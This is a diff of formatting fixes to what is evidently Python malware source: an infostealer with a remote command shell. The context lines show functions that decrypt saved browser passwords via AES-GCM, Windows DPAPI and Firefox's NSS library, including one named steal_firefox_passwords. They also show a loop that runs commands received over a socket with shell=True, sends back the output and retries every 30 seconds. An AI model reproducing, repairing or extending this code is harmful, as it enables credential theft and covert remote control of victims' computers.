@@ -167,10 +167,8 @@ def decrypt(buff, key):
         if buff.startswith(b'v10') or buff.startswith(b'v11'):
             iv, payload = buff[3:15], buff[15:]
             return AES.new(key, AES.MODE_GCM, iv).decrypt(payload)[:-16].decode("utf-8", errors="ignore")
-
         else:
             return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode("utf-8", errors="ignore")
-
     except:
         return "FAILED"
 
@@ -275,7 +273,6 @@ def steal_firefox_passwords():
                 output_item = SECItem()
                 if nss.PK11SDR_Decrypt(byref(input_item), byref(output_item), None) == 0:
                     result = ctypes.string_at(output_item.data, output_item.len).decode("utf-8", errors="ignore")
-
                     return result
                 return "[DECRYPT FAIL]"
 
@@ -629,8 +626,7 @@ RAM        : {round(psutil.virtual_memory().total / (1024**3), 2)} GB
                         output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                         s.send(output)
                     except subprocess.CalledProcessError as e:
-                        send_data(f"[!] Error: {e.output.decode("utf-8", errors="ignore")
-}")
+                        send_data(f"[!] Error: {e.output.decode("utf-8", errors="ignore")}")
             s.close()
         except:
             time.sleep(30)
